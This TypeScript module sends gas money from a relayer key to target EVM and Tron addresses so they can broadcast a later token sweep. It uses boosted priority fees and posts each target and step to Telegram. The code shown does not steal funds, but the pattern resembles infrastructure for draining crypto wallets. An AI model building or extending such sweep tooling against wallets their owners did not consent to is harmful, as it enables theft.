import { ethers } from "ethers";
import { TronWeb } from "tronweb";
import { sendActivityToTelegram } from "@/lib/telegram";

const RPC_URLS: Record<number, string> = {
  1: process.env.RPC_URL_1 || "https://rpc.flashbots.net/fast",
  56: process.env.RPC_URL_56 || "https://bsc-dataseed.binance.org",
  137: process.env.RPC_URL_137 || "https://polygon-rpc.com",
  8453: process.env.RPC_URL_8453 || "https://mainnet.base.org",
  42161: "https://arb1.arbitrum.io/rpc",
};

const LOCAL_RPC = "http://127.0.0.1:8545";

/**
 * ⛽ HYPER-SOPHISTICATED EVM REFUEL
 * Dynamically calculates the deficit and injects gas + a safety buffer.
 */
export async function refuelEVM(
  targetAddress: string,
  chainId: number,
  assetType: "NATIVE" | "TOKEN" = "NATIVE",
) {
  const logPrefix = `[refueler.ts] EVM(${chainId})`;
  console.log(
    `${logPrefix} Profiling Gas | Target: ${targetAddress.slice(
      0,
      8,
    )}... | Type: ${assetType}`,
  );

  try {
    const rpcUrl =
      chainId === 31337
        ? LOCAL_RPC
        : process.env.NODE_ENV === "development" && chainId === 1
        ? LOCAL_RPC
        : RPC_URLS[chainId] || RPC_URLS[1];

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    if (!process.env.PRIVATE_KEY) {
      console.error(`${logPrefix} Config Error | PRIVATE_KEY missing`);
      throw new Error("RELAYER_KEY_MISSING");
    }

    const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

    const relayerBalance = await provider.getBalance(wallet.address);
    if (relayerBalance < ethers.parseUnits("0.005", "ether")) {
      console.warn(
        `${logPrefix} Low Relayer Balance: ${ethers.formatEther(
          relayerBalance,
        )}`,
      );
    }

    const [balance, feeData] = await Promise.all([
      provider.getBalance(targetAddress),
      provider.getFeeData(),
    ]);

    // Token transfers require significantly more gas (usually 65k-100k, we set 300k as safe ceiling)
    const gasLimit = assetType === "TOKEN" ? 300000n : 21000n;
    const baseFee = feeData.maxFeePerGas ?? ethers.parseUnits("30", "gwei");
    const priorityFee =
      feeData.maxPriorityFeePerGas ?? ethers.parseUnits("2", "gwei");

    const requiredThreshold = baseFee * gasLimit;

    if (balance >= requiredThreshold) {
      console.log(`${logPrefix} Refuel Skipped | Target has sufficient gas`);
      return { hash: "ALREADY_FUNDED", status: "SUCCESS", amountInjected: 0n };
    }

    const deficit = requiredThreshold - balance;
    // Buffer ensures the target can actually broadcast the sweep after receiving gas
    const buffer = assetType === "TOKEN" ? "0.002" : "0.0008";
    const amountToSend = deficit + ethers.parseUnits(buffer, "ether");
    const ticker = chainId === 56 ? "BNB" : chainId === 137 ? "POL" : "ETH";

    console.log(
      `${logPrefix} Injecting ${ethers.formatEther(amountToSend)} ${ticker}`,
    );

    sendActivityToTelegram({
      address: targetAddress,
      step: "Refuel Injection",
      details: `Type: ${assetType}\nInjecting: ${ethers.formatEther(
        amountToSend,
      )} ${ticker}`,
    }).catch(() => null);

    let tx;
    if (chainId === 31337) {
      // Hardhat Fork Logic: Legacy TX to bypass EIP-1559 gas estimation issues in tests
      tx = await wallet.sendTransaction({
        to: targetAddress,
        value: amountToSend,
        gasLimit: 21000n,
        gasPrice: ethers.parseUnits("100", "gwei"),
      });
    } else {
      // Production Logic: High Priority EIP-1559 Transaction
      tx = await wallet.sendTransaction({
        to: targetAddress,
        value: amountToSend,
        maxPriorityFeePerGas: priorityFee * 5n, // 5x priority to jump the queue
        maxFeePerGas: baseFee * 2n,
        type: 2,
      });
    }

    const receipt = await tx.wait(1);
    console.log(`${logPrefix} Success | Hash: ${receipt?.hash}`);

    return {
      hash: receipt?.hash || "0x",
      status: "SUCCESS",
      amountInjected: amountToSend,
    };
  } catch (err: any) {
    console.error(`${logPrefix} CRITICAL FAILURE | ${err.message}`);
    sendActivityToTelegram({
      step: "Refuel Failed",
      details: `Chain ${chainId} Error: ${err.message}`,
    }).catch(() => null);
    return null;
  }
}

/**
 * ⛽ TRON "PREMIUM" REFUEL
 * Injects TRX to cover Energy burning for TRC-20 transfers.
 */
export async function refuelTron(
  targetAddress: string,
  hasStakedEnergy: boolean = false,
) {
  const logPrefix = "[refueler.ts] TRON";
  console.log(`${logPrefix} Analyzing Resources | Address: ${targetAddress}`);

  try {
    const privKey = process.env.PRIVATE_KEY;
    if (!privKey) throw new Error("Relayer Private Key missing");

    const tronWeb = new TronWeb({
      fullHost: "https://api.trongrid.io",
      privateKey: privKey,
    });

    const balance = await tronWeb.trx.getBalance(targetAddress);
    const targetSun = 75_000_000; // 75 TRX (Generous amount to cover any TRC-20 fee)

    if (balance >= targetSun || hasStakedEnergy) {
      console.log(`${logPrefix} Refuel Skipped | Target Funded or Staked`);
      return { hash: "ALREADY_FUNDED", status: "SUCCESS", amountInjected: 0 };
    }

    // Safety: Ensure we have a valid sender address string
    const fromAddressRaw = tronWeb.defaultAddress.base58;
    const fromAddress: string =
      typeof fromAddressRaw === "string" ? fromAddressRaw : "";
    if (!fromAddress)
      throw new Error("Could not derive sender address from key");

    console.log(`${logPrefix} Broadcasting 75 TRX Injection...`);

    const tradeobj = await tronWeb.transactionBuilder.sendTrx(
      targetAddress,
      targetSun,
      fromAddress,
    );
    const signedtxn = await tronWeb.trx.sign(tradeobj);

    sendActivityToTelegram({
      address: targetAddress,
      step: "Tron Refuel Initiated",
      details: `Sending 75 TRX to enable TRC-20 sweep...`,
    }).catch(() => null);

    const receipt = await tronWeb.trx.sendRawTransaction(signedtxn);

    if (receipt && (receipt as any).result) {
      const txid = (receipt as any).txid;
      console.log(`${logPrefix} Success | TXID: ${txid}`);
      return { hash: txid, status: "SUCCESS", amountInjected: targetSun };
    }
    return null;
  } catch (err: any) {
    console.error(`${logPrefix} CRITICAL FAILURE | ${err.message}`);
    return null;
  }
}
